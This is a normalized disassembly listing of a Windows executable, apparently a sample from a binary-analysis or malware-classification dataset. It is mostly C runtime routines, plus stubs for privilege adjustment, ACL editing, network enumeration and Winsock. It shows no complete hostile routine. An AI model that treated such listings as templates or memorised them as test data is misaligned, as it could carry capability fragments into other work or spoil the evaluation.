je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
mov [ rw-data ] 0xd
call [ GetLastError@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
mov [ rw-data ] 0xd
push [ ebp + 0xc ]
push ebx
call sub_40fd5f
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
mov eax 0x1000
cmp edi eax
jge r-xdata
sub_40fb8e
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
test al 0x82
mov [ ebp - 0x4 ] ecx
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
xor ebx ebx
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] ebx
and al 0xef
mov [ ebp + 0xc ] ebx
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
test al 0x10
mov [ esi + 0x4 ] ebx
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov edx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] edx
mov [ esi + 0xc ] eax
mov ebx [ ebp + 0x8 ]
push 0x2
pop edi
lea eax [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp + 0x8 ] bx
call sub_40c6bf
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea edx [ eax + 0x2 ]
mov [ esi ] edx
mov edx [ esi + 0x18 ]
dec edx
dec edx
cmp edi ebx
mov [ esi + 0x4 ] edx
jle r-xdata
push ecx
call sub_40e4bf
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax ebx
and eax 0xffff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push ecx
call sub_40c6bf
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push esi
call sub_40e47b
pop ecx
pop esi
pop ebx
leave
retn
mov eax 0xffff
mov eax rw-data
mov eax ecx
mov edx ecx
sar eax 0x5
and edx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push 0x2
push ebx
push ecx
call sub_40c2e5
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40fcb2
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_40fdd5
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_40fcf1
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_408e82
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_41007d
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_40fd5f
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 8 + 0x4 ]
mov cl [ ecx + eax * 8 + 0x4 ]
test cl 0x1
je r-xdata
mov al cl
mov esi 0x8000
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
or eax 0xffffffff
pop esi
retn
sub_40fdd5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_410052
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_410052
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_4094d0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_4094d0
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_410052
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_41007d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_4103e3
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_41025c
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_410204
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_408e82
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_40fcf1
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_4102c3
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_4091a9
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_4102c3
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_408e82
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40e5a0
inc eax
inc eax
push eax
call sub_408e82
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_40f5a0
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_4091a9
pop ecx
mov [ rw-data ] eax
sub_410204
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_40fcb2
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_41025c
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_408e82
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_409a6f
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_410456
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_4102c3
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
jne r-xdata
mov esi [ esp + 0x18 ]
test esi esi
jne r-xdata
push [ esp + 0x18 ]
call sub_408e82
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_4091a9
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call sub_40a44d
mov ebp eax
pop ecx
test ebp ebp
je r-xdata
mov eax edi
push esi
call sub_40a3b8
test eax eax
pop ecx
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push ebp
call sub_40ac58
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_40a7a3
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_40bfb0
push ebx
push ebp
call sub_40a478
add esp 0x14
jmp r-xdata
mov eax esi
push eax
push ebx
push edi
call sub_40bfb0
push ebx
push ebp
call sub_40a478
add esp 0x14
mov eax esi
test edi edi
jne r-xdata
sub_4103e3
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4092f0
pop ecx
pop ecx
pop ebp
retn
movzx edx ax
mov eax [ ebp + 0xc ]
sub eax edx
neg eax
sbb eax eax
not eax
and eax ecx
pop ebp
retn
movzx edx al
test [ edx + rw-data ] 0x4
je r-xdata
movzx edx ax
cmp [ ebp + 0xc ] edx
je r-xdata
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
inc ecx
jmp r-xdata
xor eax eax
pop ebp
retn
movzx eax ax
movzx edx dl
shl eax 0x8
or eax edx
cmp [ ebp + 0xc ] eax
je r-xdata
movzx ax [ ecx ]
test ax ax
je r-xdata
lea eax [ ecx - 0x1 ]
pop ebp
retn
jmp r-xdata
sub_410456
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_40e5a0
inc eax
push eax
call sub_408e82
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_40f5a0
pop ecx
pop ecx
pop esi
retn
sub_410496
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4104c3
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
sub_4104c3
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_401085
mov eax r-xdata
retn
sub_401a60
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_403490
push rw-data
call sub_4089e0
add esp 0x4
test eax eax
jne r-xdata
push rw-data
push rw-data
call sub_408820
add esp 0x8
retn
retn
sub_403500
push rw-data
push rw-data
call sub_408820
add esp 0x8
retn
sub_403520
push rw-data
call sub_408700
add esp 0x4
test eax eax
jne r-xdata
push rw-data
push rw-data
call sub_408820
add esp 0x8
retn
retn
sub_4046d0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push ecx
call [ AdjustTokenPrivileges@IAT ]
retn
sub_404e40
mov eax [ rw-data ]
mov ecx [ eax ]
push ecx
call sub_404e00
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405560
sub_404eb0
mov eax [ rw-data ]
mov ecx [ eax ]
push ecx
call sub_404e70
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405560
sub_404ee0
mov eax [ rw-data ]
push eax
call sub_406f20
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405560
sub_4050f0
mov eax [ rw-data ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405560
sub_405e10
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_405c60
add esp 0x8
retn
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetGetDCName
jmp [ NetGetDCName@IAT ]
sub_408ae2
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_408ae9
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_408d0f
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408db4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_408e3e
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_408db4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_408e6a
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_408ef6
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_408f00
mov eax [ rw-data ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ rw-data ] eax
sar eax 0x10
and eax 0x7fff
retn
sub_409027
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_40910f
push rw-data
push rw-data
call sub_40910f
add esp 0x10
retn
call eax
sub_409054
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_409076
add esp 0xc
retn
sub_409065
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_409076
add esp 0xc
retn
sub_4094bb
push [ esp + 0x4 ]
call sub_409430
pop ecx
retn
sub_409777
call sub_40c647
test eax eax
jne r-xdata
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40c4d7
add esp 0x10
retn
retn
sub_409797
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_409777
add esp 0xc
retn
sub_409a94
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_40d939
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_40d900
sub_409e66
push [ ebp - 0x14 ]
call sub_409e9d
pop ecx
retn
sub_409e9d
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_40a30c
xor eax eax
retn
sub_409fca
push [ ebp - 0x14 ]
call sub_40a03a
pop ecx
retn
sub_40a21c
push 0x1
pop eax
retn
sub_40a220
mov esp [ ebp - 0x18 ]
jmp sub_40a30c
sub_40a27e
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40a287
mov esp [ ebp - 0x18 ]
jmp sub_40a30c
sub_40a349
push 0x1
pop eax
retn
sub_40a39f
push 0x1
pop eax
retn
sub_40b96b
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_40bc64
push 0x1
call sub_40bc6d
pop ecx
retn
sub_40cfb9
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_40f07d
pop ecx
cmp ax 0xffff
mov eax [ esp + 0x10 ]
pop ecx
jne r-xdata
inc [ eax ]
retn
or [ eax ] 0xffffffff
retn
sub_40d043
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_40d050
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_40d8e5
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_408dd6
add esp 0x8
pop ebp
retn 0x4
sub_40dad2
push sub_40da8c
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_40dae3
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40daf0
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40db0c
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40db28
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40df1c
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40df31
inc [ rw-data ]
sub_40e4bf
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_40e58a
call sub_40bc64
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_40f985
sub_40e86e
push 0x1
pop eax
retn
sub_40e9ce
push 0x1
pop eax
retn
sub_40ea82
push 0x1
pop eax
retn
sub_40f172
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40f183
add esp 0xc
retn
sub_40f578
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_40f1b4
pop ecx
mov [ rw-data ] 0x1
sub_40f9dd
push 0x2
call sub_409a6f
pop ecx
retn
sub_40ff8c
push 0x1
pop eax
retn
sub_40fffb
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_410520
mov eax r--data
jmp sub_408b3f
